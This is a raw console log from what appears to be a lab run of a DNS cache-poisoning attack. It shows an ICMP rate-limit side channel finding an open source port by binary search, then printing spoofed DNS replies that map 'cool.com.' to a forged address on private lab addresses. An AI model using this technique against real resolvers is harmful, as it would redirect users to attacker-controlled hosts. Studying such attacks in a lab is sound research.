preparing spoofed replies.
spoofed replies prepared.
Time needed to prepare all spoofed replies: 153.43009494099988
----------Iteration 1 is starting.----------
attack_burst: (port_start, # of probe, # of padding):50000,200,0
Begin emission:
Finished sending 1 packets.
No port is open. IMCP rate limit is already drained.
Got reply from do_one_attack_chunk : -1
time needed in this iteration of loop: 1342 ms
attack_burst: (port_start, # of probe, # of padding):50200,200,0
No port is open. IMCP rate limit is already drained.
Got reply from do_one_attack_chunk : -1
time needed in this iteration of loop: 1456 ms
attack_burst: (port_start, # of probe, # of padding):50400,200,0
No port is open. IMCP rate limit is already drained.
Got reply from do_one_attack_chunk : -1
time needed in this iteration of loop: 1322 ms
Percent	Sum	Calls	Min	Max	Mean	Function
100.0	4.120	3	1.322	1.456	1.373	do_one_chunk_of_attack
4.120 Total Time
----------Iteration 1 is completed.----------
----------Iteration 2 is starting.----------
attack_burst: (port_start, # of probe, # of padding):50000,200,0
Begin emission:
Finished sending 1 packets.
Yaaay, got ICMP port unreachable message. At least one port is open.
Got reply from do_one_attack_chunk : 50000
attack_burst: (port_start, # of probe, # of padding):50000,100,100
No port is open. IMCP rate limit is already drained.
attack_burst: (port_start, # of probe, # of padding):50100,100,100
Yaaay, got ICMP port unreachable message. At least one port is open.
attack_burst: (port_start, # of probe, # of padding):50100,50,150
Yaaay, got ICMP port unreachable message. At least one port is open.
attack_burst: (port_start, # of probe, # of padding):50100,25,175
Yaaay, got ICMP port unreachable message. At least one port is open.
attack_burst: (port_start, # of probe, # of padding):50100,13,187
Yaaay, got ICMP port unreachable message. At least one port is open.
attack_burst: (port_start, # of probe, # of padding):50100,7,193
Yaaay, got ICMP port unreachable message. At least one port is open.
attack_burst: (port_start, # of probe, # of padding):50100,4,196
No port is open. IMCP rate limit is already drained.
attack_burst: (port_start, # of probe, # of padding):50104,3,197
Yaaay, got ICMP port unreachable message. At least one port is open.
attack_burst: (port_start, # of probe, # of padding):50104,2,198
No port is open. IMCP rate limit is already drained.
attack_burst: (port_start, # of probe, # of padding):50106,1,199
Yaaay, got ICMP port unreachable message. At least one port is open.
attack_burst: (port_start, # of probe, # of padding):50106,1,199
Yaaay, got ICMP port unreachable message. At least one port is open.



open port found in bin search : 50106



---------------found the exact port.--------------

Received 27 packets, got 1 answers, remaining 0 packets

Received 24 packets, got 1 answers, remaining 0 packets
###[ IP ]### 
  version   = 4
  ihl       = 5
  tos       = 0x0
  len       = 78
  id        = 2473
  flags     = 
  frag      = 0
  ttl       = 64
  proto     = udp
  chksum    = 0x7ba2
  src       = 192.168.58.2
  dst       = 192.168.58.1
  \options   \
###[ UDP ]### 
     sport     = domain
     dport     = 9554
     len       = 58
     chksum    = 0xf620
###[ DNS ]### 
        id        = 0
        qr        = 1
        opcode    = QUERY
        aa        = 1
        tc        = 0
        rd        = 1
        ra        = 1
        z         = 0
        ad        = 0
        cd        = 0
        rcode     = ok
        qdcount   = 1
        ancount   = 1
        nscount   = 0
        arcount   = 0
        \qd        \
         |###[ DNS Question Record ]### 
         |  qname     = 'cool.com.'
         |  qtype     = A
         |  qclass    = IN
        \an        \
         |###[ DNS Resource Record ]### 
         |  rrname    = 'cool.com.'
         |  type      = A
         |  rclass    = IN
         |  ttl       = 70000
         |  rdlen     = None
         |  rdata     = 123.123.123.123
        ns        = None
        ar        = None

None
###[ IP ]### 
  version   = 4
  ihl       = 5
  tos       = 0x0
  len       = 78
  id        = 2473
  flags     = 
  frag      = 0
  ttl       = 64
  proto     = udp
  chksum    = 0x7ba2
  src       = 192.168.58.2
  dst       = 192.168.58.1
  \options   \
###[ UDP ]### 
     sport     = domain
     dport     = 9554
     len       = 58
     chksum    = 0xf620
###[ DNS ]### 
        id        = 0
        qr        = 1
        opcode    = QUERY
        aa        = 1
        tc        = 0
        rd        = 1
        ra        = 1
        z         = 0
        ad        = 0
        cd        = 0
        rcode     = ok
        qdcount   = 1
        ancount   = 1
        nscount   = 0
        arcount   = 0
        \qd        \
         |###[ DNS Question Record ]### 
         |  qname     = 'cool.com.'
         |  qtype     = A
         |  qclass    = IN
        \an        \
         |###[ DNS Resource Record ]### 
         |  rrname    = 'cool.com.'
         |  type      = A
         |  rclass    = IN
         |  ttl       = 70000
         |  rdlen     = None
         |  rdata     = 123.123.123.123
        ns        = None
        ar        = None

None
time needed to sent all: 2765 ms
----------Iteration 2 is completed.----------
